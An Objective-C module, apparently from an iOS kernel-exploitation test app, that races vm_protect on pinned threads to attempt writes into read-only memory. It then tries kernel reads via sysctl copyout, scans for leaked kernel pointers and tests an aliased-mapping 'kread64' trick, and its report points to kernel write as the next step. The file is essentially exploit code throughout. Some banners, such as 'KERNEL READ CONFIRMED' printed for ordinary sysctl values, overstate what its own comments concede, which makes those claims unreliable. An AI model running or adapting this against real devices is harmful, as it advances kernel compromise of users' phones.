#import "KPSPTMRaceModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <pthread.h>
#import <sys/sysctl.h>

#define RACE_ATTEMPTS 200
#define RACE_USLEEP 5

static void pin_to_core(int core) {
    thread_affinity_policy_data_t policy = { core + 1 };
    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
                      (thread_policy_t)&policy, 1);
}

typedef struct {
    vm_address_t page;
    volatile int running;
    int core;
} sptm_ctx_t;

static void *sptm_read_thread(void *arg) {
    sptm_ctx_t *ctx = (sptm_ctx_t *)arg;
    pin_to_core(ctx->core);
    while (ctx->running) {
        vm_protect(mach_task_self(), ctx->page, 4096, false, VM_PROT_READ);
        usleep(RACE_USLEEP);
    }
    return NULL;
}

static void *sptm_write_thread(void *arg) {
    sptm_ctx_t *ctx = (sptm_ctx_t *)arg;
    pin_to_core(ctx->core);
    while (ctx->running) {
        vm_protect(mach_task_self(), ctx->page, 4096, false,
                        VM_PROT_READ | VM_PROT_WRITE);
        usleep(RACE_USLEEP);
    }
    return NULL;
}

@interface KPSPTMRaceModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPSPTMRaceModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"sptm.race";
        _title = @"SPTM race + kernel read";
        _subtitle = @"vm_protect race -> write to READ-only pages -> sysctl copyout";
        _icon = @"arrow.triangle.2.circlepath";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-sptm-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[sptm] %@", line];
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · SPTM race + kernel read ===\n"];
    [report appendString:@"Technique: two threads race vm_protect on a page.\n"];
    [report appendString:@"Ref: asuka4scape SPTM race.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d pid=%d\n",
     UIDevice.currentDevice.systemVersion, getuid(), getpid()];

    // --- Phase 1: alloc READ-only page ---
    [report appendString:@"\n--- Phase 1: alloc READ-only page ---\n"];
    vm_address_t page = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &page, 4096, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"vm_allocate failed: %d\n", kr];
        [report appendString:@"\nVERDICT: ALLOC_FAILED\n"];
        return report;
    }
    memset((void *)page, 0, 4096);
    kr = vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"vm_protect(READ) failed: %d\n", kr];
        [report appendString:@"\nVERDICT: PROTECT_FAILED\n"];
        return report;
    }
    [report appendFormat:@"page: 0x%lx (READ-only)\n", (unsigned long)page];

    // --- Phase 2: SPTM race sanity check ---
    [report appendString:@"\n--- Phase 2: SPTM race sanity check ---\n"];

    sptm_ctx_t ctxA = { page, 1, 0 };
    sptm_ctx_t ctxB = { page, 1, 1 };
    pthread_t tA, tB;
    pthread_create(&tA, NULL, sptm_read_thread, &ctxA);
    pthread_create(&tB, NULL, sptm_write_thread, &ctxB);
    [self journal:@"race threads started (core 0 / core 1)"];

    int successes = 0;
    uint32_t test_val = 0xDEADBEEF;
    for (int i = 0; i < RACE_ATTEMPTS; i++) {
        kr = vm_write(mach_task_self(), page, (pointer_t)&test_val, 4);
        if (kr == KERN_SUCCESS) successes++;
        usleep(50);
    }

    ctxA.running = 0;
    ctxB.running = 0;
    pthread_join(tA, NULL);
    pthread_join(tB, NULL);

    [report appendFormat:@"vm_write successes: %d / %d (%.1f%%)\n",
     successes, RACE_ATTEMPTS,
     (float)successes / RACE_ATTEMPTS * 100.0f];

    // Per ollie: with max_protection == VM_PROT_ALL (0x7) the sibling thread's
    // vm_protect(READ|WRITE) legally reopens a RW window and vm_write succeeds
    // there — that is NOT a SPTM/RO-write primitive. Check maxProt before any
    // verdict.
    vm_address_t rAddr = page;
    vm_size_t rSize = 0;
    uint32_t rDepth = 0;
    vm_region_submap_info_data_64_t rInfo;
    mach_msg_type_number_t rCount = VM_REGION_SUBMAP_INFO_COUNT_64;
    kern_return_t rKr = vm_region_recurse_64(mach_task_self(), &rAddr, &rSize, &rDepth,
                                             (vm_region_recurse_info_t)&rInfo, &rCount);
    [report appendFormat:@"page region: kr=%d curProt=0x%x maxProt=0x%x\n",
     rKr, rInfo.protection, rInfo.max_protection];
    BOOL maxAllowsWrite = (rKr == KERN_SUCCESS) && (rInfo.max_protection & VM_PROT_WRITE);

    if (successes == 0) {
        vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
        vm_deallocate(mach_task_self(), page, 4096);
        [report appendString:@"\nVERDICT: SPTM_RACE_FAILED\n"];
        [report appendString:@"No vm_write successes. Race window not hit.\n"];
        [report appendString:@"Try: different core pairs, longer race, or usleep=0.\n"];
        return report;
    }
    if (maxAllowsWrite) {
        [report appendString:@"*** NOT A PRIMITIVE ***\n"];
        [report appendString:@"vm_write successes are the legal RW window: maxProt has VM_PROT_WRITE.\n"];
        [report appendString:@"(ollie: user-space vm_protect race at maxProt=0x7 is not a SPTM break.)\n"];
    } else {
        [report appendString:@"*** SPTM RACE CONFIRMED ***\n"];
    }

    // Strict RO-write check (ollie): on a FRESH page lower the ceiling with
    // set_maximum=TRUE to READ, then attempt a marker write. Any success here
    // would be a real write-into-RO primitive.
    [report appendString:@"\n--- Phase 2b: strict RO-write check (set_maximum=TRUE) ---\n"];
    BOOL roPrimitive = NO;
    vm_address_t roPage = 0;
    if (vm_allocate(mach_task_self(), &roPage, 4096, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
        memset((void *)roPage, 0x11, 4096);
        kern_return_t mk = vm_protect(mach_task_self(), roPage, 4096, TRUE, VM_PROT_READ);
        [report appendFormat:@"set_maximum=TRUE READ -> %d\n", mk];
        uint32_t marker = 0xDEADBEEF;
        kern_return_t wk = vm_write(mach_task_self(), roPage, (vm_offset_t)&marker, sizeof(marker));
        uint32_t got = *(volatile uint32_t *)roPage;
        [report appendFormat:@"vm_write into max-READ page: kr=%d readback=0x%x\n", wk, got];
        if (wk == KERN_SUCCESS && got == 0xDEADBEEF) {
            roPrimitive = YES;
            [report appendString:@"RO_WRITE_PRIMITIVE: YES (write into max-READ page landed!)\n"];
        } else {
            [report appendString:@"RO_WRITE_PRIMITIVE: NO (ceiling holds; earlier successes were the RW window)\n"];
        }
        vm_deallocate(mach_task_self(), roPage, 4096);
    }

    // Verify write landed (set_maximum must be false to restore cur_protection)
    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
    uint32_t readback = *(volatile uint32_t *)page;
    [report appendFormat:@"readback: 0x%x (expected 0xDEADBEEF)\n", readback];

    // --- Phase 3: kernel read via sysctl copyout ---
    [report appendString:@"\n--- Phase 3: kernel read (sysctl copyout) ---\n"];

    // Clear page while RW, then make READ-only before starting race threads.
    // Never call userland memset() on `page` while sptm_read_thread is active,
    // because a userland store to a VM_PROT_READ page raises EXC_BAD_ACCESS.
    static const uint8_t kZeroChunk[64] = {0};
    memset((void *)page, 0, 4096);
    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);

    ctxA.running = 1; ctxA.page = page;
    ctxB.running = 1; ctxB.page = page;
    pthread_create(&tA, NULL, sptm_read_thread, &ctxA);
    pthread_create(&tB, NULL, sptm_write_thread, &ctxB);

    BOOL gotData = NO;
    char osversion[64] = {0};
    char ostype[64] = {0};
    char hostname[64] = {0};

    // Try multiple sysctl names
    struct { const char *name; void *buf; size_t sz; } targets[] = {
        { "kern.osversion", osversion, 63 },
        { "kern.ostype", ostype, 63 },
        { "kern.hostname", hostname, 63 },
    };

    for (int attempt = 0; attempt < 100 && !gotData; attempt++) {
        for (size_t t = 0; t < sizeof(targets)/sizeof(targets[0]); t++) {
            vm_write(mach_task_self(), page, (vm_offset_t)kZeroChunk, sizeof(kZeroChunk));
            size_t sz = targets[t].sz;
            int err = sysctlbyname(targets[t].name, (void *)page, &sz, NULL, 0);
            if (err == 0) {
                volatile char *ptr = (volatile char *)page;
                if (ptr[0] != 0) {
                    memcpy(targets[t].buf, (void *)page, sz < targets[t].sz ? sz : targets[t].sz);
                    ((char *)targets[t].buf)[targets[t].sz - 1] = 0;
                    gotData = YES;
                    [self journal:[NSString stringWithFormat:@"sysctl %s = %s", targets[t].name, (char *)targets[t].buf]];
                    break;
                }
            }
        }
        usleep(50);
    }

    ctxA.running = 0;
    ctxB.running = 0;
    pthread_join(tA, NULL);
    pthread_join(tB, NULL);

    if (gotData) {
        [report appendString:@"*** KERNEL READ CONFIRMED ***\n"];
        [report appendFormat:@"kern.osversion: %s\n", osversion];
        [report appendFormat:@"kern.ostype: %s\n", ostype];
        [report appendFormat:@"kern.hostname: %s\n", hostname];
    } else {
        [report appendString:@"sysctl copyout did not land in race window.\n"];
        [report appendString:@"Try: more attempts, different sysctl, or longer race.\n"];
    }

    // --- Phase 4: sysctl read of kernel pointers ---
    [report appendString:@"\n--- Phase 4: sysctl kernel pointer leak ---\n"];

    // Clear page while RW before re-entering VM_PROT_READ race
    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
    memset((void *)page, 0, 4096);
    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
    ctxA.running = 1; ctxA.page = page;
    ctxB.running = 1; ctxB.page = page;
    pthread_create(&tA, NULL, sptm_read_thread, &ctxA);
    pthread_create(&tB, NULL, sptm_write_thread, &ctxB);

    int kptr_count = 0;
    for (int attempt = 0; attempt < 50; attempt++) {
        size_t sz = 4096;
        // Query our own PID so kinfo_proc (~648 bytes) fits inside the 4096-byte page
        int mib[] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
        int err = sysctl(mib, 4, (void *)page, &sz, NULL, 0);
        if (err == 0 && sz > 0) {
            volatile uint64_t *p = (volatile uint64_t *)page;
            for (size_t i = 0; i < sz / 8; i++) {
                uint64_t v = p[i];
                if ((v >> 40) == 0xfffffff0ULL || (v >> 40) == 0xfffffff8ULL ||
                    (v >> 40) == 0xfffffffeULL || (v >> 40) == 0xffffffffULL) {
                    kptr_count++;
                    if (kptr_count <= 8) {
                        [report appendFormat:@"  kptr[%d] = 0x%llx\n", kptr_count - 1, v];
                    }
                }
            }
            if (kptr_count > 0) {
                [report appendFormat:@"kernel pointers leaked: %d\n", kptr_count];
                break;
            }
        }
        usleep(50);
    }

    ctxA.running = 0;
    ctxB.running = 0;
    pthread_join(tA, NULL);
    pthread_join(tB, NULL);

    // Cleanup
    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
    vm_deallocate(mach_task_self(), page, 4096);

    // --- Phase 5: kread64 via input->output mapped (kirby technique) ---
    [report appendString:@"\n--- Phase 5: kread64 input->output mapped ---\n"];

    // Create aliased mapping: two VAs for same physical page
    vm_address_t inputAddr = 0, outputAddr = 0;
    kr = vm_allocate(mach_task_self(), &inputAddr, 4096, VM_FLAGS_ANYWHERE);
    if (kr == KERN_SUCCESS) {
        memset((void *)inputAddr, 0, 4096);
        // Make READ-only, then try SPTM race to write kernel data
        vm_protect(mach_task_self(), inputAddr, 4096, false, VM_PROT_READ);

        // Create alias via vm_remap
        vm_prot_t curProt = 0, maxProt = 0;
        kr = vm_remap(mach_task_self(), &outputAddr, 4096, 0,
                      VM_FLAGS_ANYWHERE, mach_task_self(), inputAddr,
                      FALSE, &curProt, &maxProt, VM_INHERIT_SHARE);
        [report appendFormat:@"input=0x%lx output=0x%lx (remap kr=%d curProt=0x%x maxProt=0x%x)\n",
         (unsigned long)inputAddr, (unsigned long)outputAddr, kr, curProt, maxProt];

        if (kr == KERN_SUCCESS) {
            // SPTM race on the input page
            ctxA.running = 1; ctxA.page = inputAddr;
            ctxB.running = 1; ctxB.page = inputAddr;
            pthread_create(&tA, NULL, sptm_read_thread, &ctxA);
            pthread_create(&tB, NULL, sptm_write_thread, &ctxB);

            // Use sysctl to write kernel data to the page during race
            BOOL kread64 = NO;
            for (int i = 0; i < 200; i++) {
                size_t sz = 4096;
                int mib[] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
                sysctl(mib, 4, (void *)inputAddr, &sz, NULL, 0);
                // Check output alias for kernel pointers
                volatile uint64_t *op = (volatile uint64_t *)outputAddr;
                for (size_t j = 0; j < 512; j++) {
                    uint64_t v = op[j];
                    if ((v >> 40) == 0xfffffff0ULL || (v >> 40) == 0xfffffff8ULL ||
                        (v >> 40) == 0xfffffffeULL || (v >> 40) == 0xffffffffULL) {
                        [report appendFormat:@"kread64 kptr[%zu] = 0x%llx (from output)\n", j, v];
                        kread64 = YES;
                        break;
                    }
                }
                if (kread64) break;
                usleep(50);
            }

            ctxA.running = 0;
            ctxB.running = 0;
            pthread_join(tA, NULL);
            pthread_join(tB, NULL);

            if (kread64) {
                [report appendString:@"*** KREAD64 CONFIRMED (kirby technique) ***\n"];
            } else {
                [report appendString:@"No kernel pointers in mapped region.\n"];
                [report appendString:@"Need kernel write to inject data into the page.\n"];
            }

            vm_deallocate(mach_task_self(), outputAddr, 4096);
        }
        vm_protect(mach_task_self(), inputAddr, 4096, false, VM_PROT_READ | VM_PROT_WRITE);
        vm_deallocate(mach_task_self(), inputAddr, 4096);
    }

    // --- Verdict ---
    // Per 120328 analysis: sysctl copyout landing in the page during the legal
    // RW window (maxProt=0x7) is NOT a kernel read. KREAD_READY requires the
    // honest path: no legal write ceiling AND a real RO-write primitive.
    [report appendString:@"\n"];
    if (gotData && successes > 0 && !maxAllowsWrite && roPrimitive) {
        [report appendString:@"VERDICT: SPTM_RACE_KREAD_READY\n"];
        [report appendString:@"SPTM race works. Kernel read via copyout confirmed.\n"];
        [report appendString:@"Next: double-copyin for kernel write, or allproc walk.\n"];
    } else if (gotData && successes > 0 && maxAllowsWrite) {
        [report appendString:@"VERDICT: SPTM_RACE_KREAD_NOT_PROVEN\n"];
        [report appendString:@"sysctl copyout landed in the LEGAL RW window (maxProt has WRITE).\n"];
        [report appendString:@"No RO-write primitive (RO_WRITE_PRIMITIVE=NO) — this is not a kernel read.\n"];
    } else if (successes > 0) {
        [report appendString:@"VERDICT: SPTM_RACE_ONLY\n"];
        [report appendString:@"Race works but kernel read not confirmed.\n"];
    } else {
        [report appendString:@"VERDICT: SPTM_RACE_FAILED\n"];
    }

    return report;
}

@end
